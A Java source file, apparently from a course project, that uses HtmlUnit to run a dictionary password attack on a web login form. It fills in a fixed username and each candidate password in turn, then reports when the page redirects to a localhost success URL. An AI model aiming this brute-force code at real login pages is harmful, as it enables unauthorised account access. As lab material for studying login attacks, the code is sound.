package com.company;

import com.gargoylesoftware.htmlunit.Page;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.*;

import java.io.IOException;
import java.util.ArrayList;

public class FormLogin {

    String url;

    String username;
    ArrayList<String> usernames;
    ArrayList<String> dictionary;
    int maxLength;
    String characterSpace;

    WebClient client;
    HtmlPage page;
    HtmlForm form;

    public FormLogin(String url, String username, ArrayList<String> dictionary) {
        this.username = username;
        this.dictionary = dictionary;
        this.url = url;
    }

    public void setup(){
        client = new WebClient();

        try {
            HtmlPage page = (HtmlPage) client.getPage(url);
            form = page.getFormByName("login");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void login() {


        for (int i = 0; i < dictionary.size(); i++) {

            try {

                String password = dictionary.get(i);

                form.getInputByName("username").setValueAttribute(username);

                form.getInputByName("password").setValueAttribute(password);

                HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);

//            DomElement button = page.createElement("button");
//            button.setAttribute("type", "submit");
//            form.appendChild(button);
                //     Page result = button.click();

                Page result = button.click();
                String resultUrl = result.getUrl().toString();

                if(resultUrl.equals("http://localhost/3200-project/success.html")){
                    System.out.println("Success! Password is " + password);
                    break;
                } else {
                    System.out.println("Failed attempt with password: " + password);
                }


            } catch (IOException e) {
                e.printStackTrace();
            }

        }
    }



}
